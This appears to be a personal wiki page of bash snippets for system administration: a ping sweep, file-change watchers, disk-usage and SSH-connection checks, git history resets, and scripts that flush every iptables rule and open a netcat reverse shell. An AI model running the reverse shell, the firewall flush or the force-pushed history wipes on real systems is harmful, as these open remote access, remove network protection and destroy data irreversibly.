for i in {1..254} ;do (ping 192.168.1.$i -c 1 -w 5  >/dev/null && echo "192.168.1.$i" &) ;done

== Activate whenever file change ==
inotifywait -e close_write,moved_to,create -m . |
while read -r directory events filename; do
  if [ "$filename" = "myfile.py" ]; then
    ./myfile.py
  fi
done

while true; do
    inotifywait -e close_write,moved_to,create -m . |
    while read -r directory events filename; do
      if [ "$filename" = "watch_proc_stats.py" ]; then
          ./watch_proc_stats.py tmux
            fi
    done
done
== Clear all iptables ==
#!/bin/sh
echo "Stopping firewall and allowing everyone..."
iptables -t nat -F
iptables -t nat -X
iptables -t mangle -F
iptables -t mangle -X
iptables -t raw -F
iptables -t raw -X
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
iptables -F
iptables -X

== Find space ==
{{{bash
sudo du -sh * | sort -hr | head -n10
}}}


== Show logged in ips via ssh ==
{{{bash
netstat -tn 2>/dev/null | grep :22 | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr
}}}

== netcat bsd reverse shell ==
Listen:
{{{bash
nc -nvl 5555
}}}

Connect:
{{{bash
mknod /tmp/backpipe p;/bin/sh 0</tmp/backpipe | nc localhost 5555 1>/tmp/backpipe
}}}

== Git repo reset =
1.
{{{bash
# Remove the history from
rm -rf .git

# recreate the repos from the current content only
git init
git add .
git commit -m "Initial commit"

# push to the github remote repos ensuring you overwrite history
git remote add origin git@github.com:<YOUR ACCOUNT>/<YOUR REPOS>.git
git push -u --force origin master
}}}

2.
{{{bash
# Submodules safe
git checkout --orphan newBranch
git add -A  # Add all files and commit them
git commit
git branch -D master  # Deletes the master branch
git branch -m master  # Rename the current branch to master
git push -f origin master  # Force push master branch to github
git gc --aggressive --prune=all     # remove the old files
}}}

3.
{{{bash
git init
git add .
git commit -m 'Initial commit'
git remote add origin [repo_address]
git push --mirror --force
}}}
